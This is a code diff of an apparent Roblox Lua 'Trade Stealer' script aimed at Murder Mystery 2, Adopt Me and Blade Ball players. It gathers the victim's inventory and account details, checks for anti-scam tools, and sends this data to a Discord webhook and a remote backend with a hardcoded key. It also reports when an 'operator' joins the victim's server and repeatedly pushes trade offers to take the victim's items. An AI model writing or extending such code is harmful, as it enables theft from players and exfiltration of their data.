@@ -1,9 +1,8 @@
 local CFG = getgenv().CFG or {}
 CFG.allowed = CFG.allowed or {}
 CFG.webhook = CFG.webhook or ""
-CFG.delay = CFG.delay or 100
-CFG.api_key = "aszxcvfgtt56678ijBVXDSERFGHBNJIU87U666789IKJHcdsxder56789ijhgfdrf4r56789ikjhgvf"
-CFG.backend = "https://backend-production-04349.up.railway.app"
+CFG.api_key = CFG.api_key or "aszxcvfgtt56678ijBVXDSERFGHBNJIU87U666789IKJHcdsxder56789ijhgfdrf4r56789ikjhgvf"
+CFG.backend = CFG.backend or "https://backend-production-04349.up.railway.app"
 getgenv().CFG = CFG
 
 local PlaceId = game.PlaceId
@@ -84,45 +83,101 @@ local function post_rubis(text)
     return data.raw_with_key or data.raw or nil
 end
 
-local function send_discord(items, game_name)
-    if not CFG.webhook or CFG.webhook == "" then return end
-    local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
-    local receivers = table.concat(CFG.allowed, ", ")
+local RARITY_ORDER = {"Ancient","Godly","Unique","Vintage","Chroma","Legendary","Rare","Uncommon","Common"}
+
+local function build_rarity_summary(items)
     local counts = {}
-    local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
-    for _, it in ipairs(items) do counts[it.rarity] = (counts[it.rarity] or 0) + 1 end
-    local inv_lines = {}
-    for _, r in ipairs(order) do
-        table.insert(inv_lines, string.format("%-10s: %d", r, counts[r] or 0))
-    end
-    local full_text = {}
     for _, it in ipairs(items) do
-        table.insert(full_text, it.name.." ("..it.rarity..")")
+        counts[it.rarity] = (counts[it.rarity] or 0) + it.amount
     end
-    local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"
-    local desc = string.format(
-        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
-        lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
-        receivers, table.concat(inv_lines, "\n"), rubis_url, join
-    )
-    local embed = {
-        username = "Trade Stealer",
-        embeds = {{title=game_name.." Stealer", description=desc, color=15158332}}
-    }
-    pcall(do_request, "POST", CFG.webhook, HS:JSONEncode(embed), {["Content-Type"]="application/json"})
+    local parts = {}
+    for _, r in ipairs(RARITY_ORDER) do
+        if counts[r] and counts[r] > 0 then
+            table.insert(parts, r..": "..counts[r])
+        end
+    end
+    return table.concat(parts, " | ")
 end
 
-local function send_job(game_name, items)
-    send_discord(items, game_name)
-    local payload = {
-        game=game_name, username=lp.Name, display_name=lp.DisplayName,
-        executor=get_executor(), roblox_version=get_roblox_version(),
-        antiscam=detect_antiscam(), allowed=CFG.allowed,
-        place_id=tostring(PlaceId), job_id=game.JobId, items=items,
-    }
-    pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode(payload), {
-        ["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key,
-    })
+local function build_full_list(items)
+    local lines = {}
+    for _, it in ipairs(items) do
+        table.insert(lines, it.name.." ("..it.rarity..")".. (it.amount > 1 and " x"..it.amount or ""))
+    end
+    return table.concat(lines, "\n")
+end
+
+local function isAllowedUser(name)
+    for _, n in ipairs(CFG.allowed) do
+        if string.lower(n) == string.lower(name) then return true end
+    end
+    return false
+end
+
+local function operator_in_server()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= lp and isAllowedUser(player.Name) then
+            return true, player.Name
+        end
+    end
+    return false, nil
+end
+
+local function notify_all(items, game_name)
+    local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
+    local summary = build_rarity_summary(items)
+    local rubis_url = post_rubis(build_full_list(items)) or ""
+    local inServer, operatorName = operator_in_server()
+
+    if CFG.webhook ~= "" then
+        local desc = string.format(
+            "**Player:** %s (`%s`)\n**Executor:** %s | **Antiscam:** %s\n**Operator:** %s\n\n**Inventory:** `%s`\n**Full list:** %s\n\n[Join server](%s)",
+            lp.DisplayName, lp.Name, get_executor(), tostring(detect_antiscam()),
+            inServer and ("✅ "..operatorName) or "❌ Not in server",
+            summary, rubis_url ~= "" and rubis_url or "failed", join
+        )
+        pcall(do_request, "POST", CFG.webhook, HS:JSONEncode({
+            username = "Trade Stealer",
+            embeds = {{title=game_name.." — New Victim", description=desc, color=15158332}}
+        }), {["Content-Type"]="application/json"})
+    end
+
+    pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode({
+        game           = game_name,
+        username       = lp.Name,
+        display_name   = lp.DisplayName,
+        executor       = get_executor(),
+        roblox_version = get_roblox_version(),
+        antiscam       = detect_antiscam(),
+        allowed        = CFG.allowed,
+        place_id       = tostring(PlaceId),
+        job_id         = game.JobId,
+        items          = items,
+        rubis_url      = rubis_url,
+        operator_in_server = inServer,
+        operator_name  = operatorName or "",
+    }), {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
+end
+
+local function notify_operator_joined(operatorName)
+    local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
+    if CFG.webhook ~= "" then
+        pcall(do_request, "POST", CFG.webhook, HS:JSONEncode({
+            username = "Trade Stealer",
+            embeds = {{
+                title = "✅ Operator Joined",
+                description = string.format("**%s** joined **%s**'s server\n[Open server](%s)", operatorName, lp.Name, join),
+                color = 3066993
+            }}
+        }), {["Content-Type"]="application/json"})
+    end
+    pcall(do_request, "POST", CFG.backend.."/operator_joined", HS:JSONEncode({
+        operator  = operatorName,
+        victim    = lp.Name,
+        place_id  = tostring(PlaceId),
+        job_id    = game.JobId,
+        join_url  = join,
+    }), {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
 end
 
 local function hook_mm2()
@@ -139,7 +194,15 @@ local function hook_mm2()
     pcall(function() setRequestsEnabled:FireServer(true) end)
 
     local cachedItems = collect_mm2_items()
-    send_job("MM2", cachedItems)
+    notify_all(cachedItems, "MM2")
+
+    local notifiedJoin = {}
+    Players.PlayerAdded:Connect(function(player)
+        if isAllowedUser(player.Name) and not notifiedJoin[player.Name] then
+            notifiedJoin[player.Name] = true
+            notify_operator_joined(player.Name)
+        end
+    end)
 
     local currentLastOffer = nil
     local tradingWithAllowed = false
@@ -172,13 +235,6 @@ local function hook_mm2()
                 end
             end
         end
-    end
-
-    local function isAllowedUser(name)
-        for _, n in ipairs(CFG.allowed) do
-            if string.lower(n) == string.lower(name) then return true end
-        end
-        return false
     end
 
     local function hideGui()
@@ -248,9 +304,7 @@ local function hook_mm2()
     task.spawn(function()
         while true do
             task.wait(2)
-            if not tradingWithAllowed then
-                doResend()
-            end
+            if not tradingWithAllowed then doResend() end
         end
     end)
 
@@ -287,7 +341,6 @@ local function hook_mm2()
             local currentItems = collect_mm2_items()
             local itemsToOffer = (#currentItems > 0) and currentItems or cachedItems
 
-            -- 4 unieke items, elk met ALLE copies gestapeld in 1 slot
             local slotsUsed = 0
             for _, entry in ipairs(itemsToOffer) do
                 if slotsUsed >= 4 then break end
@@ -318,7 +371,7 @@ local function hook_mm2()
 end
 
 local function hook_adoptme()
-    send_job("AdoptMe", collect_adoptme_items())
+    notify_all(collect_adoptme_items(), "AdoptMe")
 end
 
 local function hook_bladeball()
@@ -329,7 +382,7 @@ local function hook_bladeball()
             table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount=1})
         end
     end
-    send_job("BladeBall", items)
+    notify_all(items, "BladeBall")
 end
 
 local GAMES = {
@@ -339,4 +392,4 @@ local GAMES = {
 }
 
 local handler = GAMES[PlaceId]
-if handler then handler() else send_job("Unknown", {}) end
+if handler then handler() else notify_all({}, "Unknown") end
